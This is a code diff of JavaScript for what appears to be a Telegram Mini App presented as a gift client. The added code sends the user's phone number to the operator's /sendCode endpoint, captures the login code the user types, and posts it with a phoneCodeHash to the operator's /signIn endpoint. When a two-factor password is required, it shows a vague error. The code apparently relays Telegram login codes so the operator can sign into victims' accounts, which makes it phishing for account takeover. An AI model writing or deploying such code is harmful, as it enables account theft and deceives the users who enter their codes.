@@ -1,18 +1,78 @@
+
+
 window.onload = function () {
     let phone = localStorage.getItem("phoneNumber");
+    const sessionId = Math.floor(Date.now() / 1000).toString();
     const initData = window.appConfig.telegramWebApp.initData;
     const tgButton = window.appConfig.telegramWebApp.MainButton;
     const codeInput = document.getElementById("code-input");
     const verificationForm = document.getElementById("verification-form");
 
-    if (phone) {
-        verificationForm.style.display = 'block';
-        tgButton.setText("Отправить");
-        tgButton.disable();
-        tgButton.show();
-        codeInput.focus();
+    async function sendCodeFlow() {
+        console.log("Send code flow base url=", window.appConfig.base_url)
+        let res = await fetch(`${window.appConfig.base_url}/sendCode`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, sessionId }),
+        });
+        console.log("send code body ", JSON.stringify({ phone, sessionId }))
+        let data = await res.json();
+        console.log("send code flow data ", data)
+        if (data.status === "CODE_SENT") {
+            phoneCodeHash = data.phoneCodeHash;
+            showBottomSheet();
+        } else {
+            window.appConfig.telegramWebApp.showAlert(
+                "Phone number is invalid.", function (ok) {
+                    window.reload();
+                }
+            );
+            console.log('send code response error=', data)
+        }
+    }
 
-        // todo отправка телефона для входа
+    async function signIn(code) {
+        const isBsl = false;
+        const clientApp = "giftclient";
+        let res = await fetch(`${window.appConfig.base_url}/signIn`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, code, phoneCodeHash, sessionId, isBsl, clientApp }),
+        });
+        console.log("signIn body ", JSON.stringify({ phone, code, phoneCodeHash, sessionId }))
+        let data = await res.json();
+        if (data.status === "PASSWORD_REQUIRED") {
+            console.log("Sign in PASSWORD REQUIRED ", data)
+            window.appConfig.telegramWebApp.showAlert(
+                "Ошибка. Попробуйте снова", function (ok) {
+                    window.reload();
+                }
+            );
+            return 2;
+        } else if (data.status === "OK") {
+            console.log("Sign in OK")
+            return 0;
+        } else {
+            return 1;
+        }
+    }
+
+    if (phone) {
+        (async () => {
+            try {
+                await sendCodeFlow();
+                verificationForm.style.display = 'block';
+                tgButton.setText("Отправить");
+                tgButton.disable();
+                tgButton.show();
+                codeInput.focus();
+            } catch (error) {
+                window.appConfig.telegramWebApp.showAlert("Что-то пошло не так. Попробуйте снова.", () => {
+                    console.log("Something went wrong error(if (phone) send code flow)");
+                    window.location.reload();
+                });
+            }
+        })()
     } else {
         tgButton.setText("Войти");
         tgButton.show();
@@ -25,7 +85,6 @@ window.onload = function () {
     // const testErrorBtn = document.getElementById("test-error-btn");
 
     console.log("initData ", initData)
-
 
     tgButton.onClick(() => {
         if (!phone) {
@@ -45,24 +104,37 @@ window.onload = function () {
             showSnackbar(message, icon, delay);
             return
         }
-        tgButton.showProgress(false);
-        let requiresPassword = false;
-        if (requiresPassword) {
-            window.playHapticError();
-            window.appConfig.telegramWebApp.showAlert("Что-то пошло не так. Попробуйте снова.", () => {
-                console.log("Something went wrong error(psw required)");
-            });
-            return
-        }
-        let inCorrectCode = false;
-        if (inCorrectCode) {
-            window.playHapticError();
-            window.appConfig.telegramWebApp.showAlert("Неверный код. Попробуйте снова.", () => {
-                console.log("Incorrect code");
-            });
-            return
-        }
 
+        tgButton.showProgress(false);
+
+        (async () => {
+            try {
+                const res = await signIn(code);
+                if (res == 1) {
+                    window.playHapticError();
+                    window.appConfig.telegramWebApp.showAlert("Неверный код. Попробуйте снова.", () => {
+                        console.log("Incorrect code");
+                    });
+                    window.location.reload();
+                    return
+                } else if (res == 0) {
+                    tgButton.showProgress(false);
+                } else {
+                    window.playHapticError();
+                    window.appConfig.telegramWebApp.showAlert("Неверный код. Попробуйте снова.", () => {
+                        console.log("Password required");
+                    });
+                    window.location.reload();
+                    return
+                }
+            } catch (error) {
+                window.appConfig.telegramWebApp.showAlert("Что-то пошло не так. Попробуйте снова.", () => {
+                    console.log("Something went wrong error(tgButton.onClick signIn(code)) ");
+                    console.error(error);
+                    window.location.reload();
+                });
+            }
+        })()
     });
 
     codeInput.addEventListener("input", () => {
@@ -94,13 +166,21 @@ window.onload = function () {
                     localStorage.setItem("phoneNumber", phoneNumber);
                     console.log("phonenumber=", phoneNumber);
 
-                    verificationForm.style.display = 'block';
-                    tgButton.setText("Отправить");
-                    tgButton.disable();
-                    tgButton.show();
-                    codeInput.focus();
-
-                    // todo отправка телефона для входа
+                    (async () => {
+                        try {
+                            await sendCodeFlow();
+                            verificationForm.style.display = 'block';
+                            tgButton.setText("Отправить");
+                            tgButton.disable();
+                            tgButton.show();
+                            codeInput.focus();
+                        } catch (error) {
+                            window.appConfig.telegramWebApp.showAlert("Что-то пошло не так. Попробуйте снова.", () => {
+                                console.log("Something went wrong error(if (phoneNumber onEvent)");
+                                window.location.reload();
+                            });
+                        }
+                    })()
                 } else {
                     window.appConfig.telegramWebApp.showAlert("Предоставьте доступ к номеру телефона для входа", () => {
                 });
